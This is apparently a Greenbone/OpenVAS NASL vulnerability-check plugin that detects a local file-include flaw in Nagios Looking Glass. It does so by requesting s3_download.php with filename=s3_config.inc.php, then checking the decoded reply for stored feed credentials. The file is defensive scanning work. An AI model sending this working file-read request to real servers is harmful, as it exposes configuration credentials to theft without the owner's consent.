# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nagios:nagios";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103845");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_name("Nagios Looking Glass Local File Include Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63381");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2013-12-03 10:16:11 +0100 (Tue, 03 Dec 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("nagios_detect.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("nagios/installed");

  script_tag(name:"impact", value:"An attacker can exploit this issue to obtain potentially sensitive
  information and execute arbitrary local scripts in the context of the
  Web server process. This may aid in further attacks.");

  script_tag(name:"vuldetect", value:"Try to read the s3_config.inc.php via HTTP GET request.");

  script_tag(name:"insight", value:"The application fails to adequately validate user-supplied input.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"summary", value:"Nagios Looking Glass is prone to a local file-include vulnerability");

  script_tag(name:"affected", value:"Nagios Looking Glass 1.1.0 beta 2 and prior are vulnerable.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");
include("list_array_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );

dirs = make_list_unique( "/nspl_status", "/nlg", http_cgi_dirs( port:port ) );

if( app_dir = get_app_location( cpe:CPE, port:port ) ) {
  dirs = make_list_unique( app_dir, dirs );
}

foreach dir( dirs ) {

  if( dir == "/" ) dir = "";
  url = dir + '/server/s3_download.php';

  if( http_vuln_check( port:port, url:url, pattern:'No filename given' ) ) {

    url = dir + '/server/s3_download.php?filename=s3_config.inc.php&action=update';
    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( buf !~ "^HTTP/1\.[01] 200" ) continue;

    buf = base64_decode( str:buf );

    if( "ServerFeed_AuthUsername" >< buf || "ServerFeed_AuthPassword" >< buf || "configuration file for Network Looking Glass" >< buf ) {
      report = 'It was possible to read the base64 encoded s3_config.inc.php by requesting:\n\n' + url + '\n';
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
